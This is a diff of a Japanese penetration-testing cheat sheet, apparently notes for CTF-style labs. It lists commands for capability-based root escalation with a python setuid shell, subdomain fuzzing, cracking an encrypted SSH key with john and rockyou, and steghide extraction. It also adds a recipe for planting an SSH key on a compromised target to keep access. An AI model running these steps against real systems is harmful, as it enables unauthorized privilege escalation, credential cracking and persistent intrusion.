@@ -363,34 +363,54 @@ ESC：詳細自動ステップ実行の停止
 #### Capabilities  
 ```getcap -r / 2>/dev/null```  
 > rootに昇格可能な物を見つける
+
 ```./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'```  
 > pythonでuidを0に設定してシェルを起動する例  
 
 
 #### Subdmain  
-'''wfuzz -c -H "Host: FUZZ.<target domain>" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://<targetIP>'''  
+```wfuzz -c -H "Host: FUZZ.<target domain>" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://<targetIP>```  
 > サブドメインを見つける．  
-'''wfuzz -c -H "Host: FUZZ.<target domain>" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://<target ip> --hh <length>'''  
+
+
+```wfuzz -c -H "Host: FUZZ.<target domain>" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://<target ip> --hh <length>```  
 > 一つ上のコマンドでサブドメインが見つからなかった時のlengthを見つけた時にそのlengthを数値で指定して実行する  
 
 #### hash analyze  
-'''hashid <hash>'''  
+```hashid <hash>```  
 > ハッシュの種類を特定する．$とかはエスケープすること  
 
 #### encrypted id_rsa  
-'''ssh2john id_rsa >> id_rsa.john'''  
+```ssh2john id_rsa >> id_rsa.john```  
 > johnでパスクラできる形式に変換  
-'''john id_rsa.john --wordlist=rockyou.txt'''  
+
+```john id_rsa.john --wordlist=rockyou.txt```  
 > johnでパスクラ  
 
 #### steghide  
-'''steghide extract -sf <image>'''  
+```steghide extract -sf <image>```  
 > 画像からファイルを抽出  
 
+#### ssh の証明書をtarget内で作成  
+```cd ~/```  
+```mkdir .ssh```  
+```ssh-keygen -q -t rsa -N ‘’ -C ‘pam’```  
+```cp .ssh/id_rsa.pub .ssh/authorized_keys```  
+```chmod 600 .ssh/authorized_keys```  
+> targetのシェルを取ったら上記を実行  
+> これで鍵のペアが作成される  
 
+```cat .ssh/id_rsa | base64```  
+> 秘密鍵をbase64にするとローカルへのコピーが楽になる  
+
+```echo -n '<base64 id_rsa>' | base64 -d > target_id_rsa```  
+```chmod 600 target_id_rsa```  
+```ssh -i target_id_rsa <user>@<target domain>```  
+> 上記をローカルで実行するとターゲット上で作成した鍵でssh接続できるようになる。  
 
 
 <br>  
 
 #### スタック時のアドバイス  
 ・キーワードになりそうなもの(些細なものでも)を一旦メモか何かにまとめる．  
+・crontab -l  
